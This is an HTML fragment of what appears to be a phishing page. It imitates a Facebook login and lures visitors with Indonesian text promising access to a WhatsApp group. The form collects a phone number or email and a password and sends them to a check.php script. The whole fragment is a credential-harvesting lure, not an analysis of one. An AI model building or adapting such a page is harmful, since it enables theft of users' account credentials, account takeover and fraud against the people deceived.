...
<body>
  <form action="check.php" method="POST">
      <img class='fb' src='img/fb-atas.jpg'>
        ...
        <div class='txt-wa'>Masuk dengan akun Facebook<br>Untuk terhubung ke Group Whatsapp</div>
        <input type='text' class='isi-fb-a' name='email' placeholder='Nomor Ponsel atau Email' required>
        <input type='password' class='isi-fb-b' name='password' placeholder='Kata Sandi' required>
